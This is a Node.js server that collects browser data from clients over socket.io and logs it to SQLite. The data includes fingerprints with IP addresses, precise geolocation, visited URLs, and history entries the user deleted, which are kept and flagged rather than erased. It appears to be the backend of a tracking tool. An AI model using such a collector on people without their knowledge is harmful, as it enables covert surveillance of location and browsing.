// Import modules.
var express    = require('express')
  , app        = express()
  , server     = require('http').createServer(app)
  , sio        = require('socket.io')
  , io         = sio.listen(server, { log: false })
  , db         = require('sqlite-wrapper')('activity.db')
  ;

// Start server.
server.listen(8080);

///////////////////////////////////////////////////////////////////////////////
// WebSockets handling.
///////////////////////////////////////////////////////////////////////////////

io.sockets.on('connection', function (socket) {
    // Get browser fingerprint (DB: Fingerprints).
    socket.on('fingerprint', function (data) {
        addFingerprint(data, socket.handshake.address.address);
        console.log(data.uuid, '[+] Fingerprint');
    });
    // Get current location (DB: Geopositions).
    socket.on('geoposition', function (data) {
        addGeoposition(data);
        console.log(data.uuid, '[+] Geoposition');
    });
    // Get URL visit (DB: History).
    socket.on('url-visit', function (data) {
        addURLVisit(data);
        console.log(data.uuid, '[+] URL Visit');
    });
    // Get URL removal (DB: History).
    socket.on('url-removed', function (data) {
        addURLRemoval(data);
        console.log(data.uuid, '[+] URL Removal');
    });
});

///////////////////////////////////////////////////////////////////////////////
// Database handling.
///////////////////////////////////////////////////////////////////////////////

// Create tables.
db.createTable('Fingerprints', {
    'timestamp':        {type: 'INTEGER'},
    'uuid':             {type: 'TEXT'},
    'ipAddress':        {type: 'TEXT'},
    'userAgent':        {type: 'TEXT'},
    'screenResolution': {type: 'TEXT'}
});
db.createTable('Geopositions', {
    'timestamp':        {type: 'INTEGER'},
    'uuid':             {type: 'TEXT'},
    'latitude':         {type: 'REAL'},
    'longitude':        {type: 'REAL'},
    'accuracy':         {type: 'INTEGER'},
    'altitude':         {type: 'INTEGER'},
    'altitudeAccuracy': {type: 'REAL'},
    'heading':          {type: 'REAL'},
    'speed':            {type: 'REAL'}
});
db.createTable('History', {
    'timestamp':        {type: 'INTEGER'},
    'uuid':             {type: 'TEXT'},
    'id':               {type: 'TEXT'},
    'title':            {type: 'TEXT'},
    'url':              {type: 'TEXT'},
    'lastVisitTime':    {type: 'INTEGER'},
    'typedCount':       {type: 'INTEGER'},
    'visitCount':       {type: 'INTEGER'},
    'removed':          {type: 'INTEGER'}
});

// Define adding functions.
var addFingerprint = function (data, ipAddress) {
    var payload = JSON.parse(data.payload);
    db.insert('Fingerprints', {
        timestamp: data.time,
        uuid: data.uuid,
        ipAddress: ipAddress,
        userAgent: payload.userAgent,
        screenResolution: payload.screenResolution
    });
};

var addGeoposition = function (data) {
    if (data.payload === "null") {
        var payload = { coords: {} };
    } else {
        var payload = JSON.parse(data.payload);
    }
    db.insert('Geopositions', {
        timestamp: data.time,
        uuid: data.uuid,
        latitude: payload.coords.latitude,
        longitude: payload.coords.longitude,
        accuracy: payload.coords.accuracy,
        altitude: payload.coords.altitude,
        altitudeAccuracy: payload.coords.altitudeAccuracy,
        heading: payload.coords.heading,
        speed: payload.coords.speed
    });
};

var addURLVisit = function(data) {
    var payload = JSON.parse(data.payload);
    db.insert('History', {
        timestamp: data.time,
        uuid: data.uuid,
        id: payload.id,
        title: payload.title,
        url: payload.url,
        lastVisitTime: Math.floor(payload.lastVisitTime),
        typedCount: payload.typedCount,
        visitCount: payload.visitCount,
        removed: 0
    });
};

var addURLRemoval = function(data) {
    var payload = JSON.parse(data.payload);
    payload.urls.forEach(function (entry) {
        db.update('History', 'url=?', [entry], { removed : 1 });
    });
};
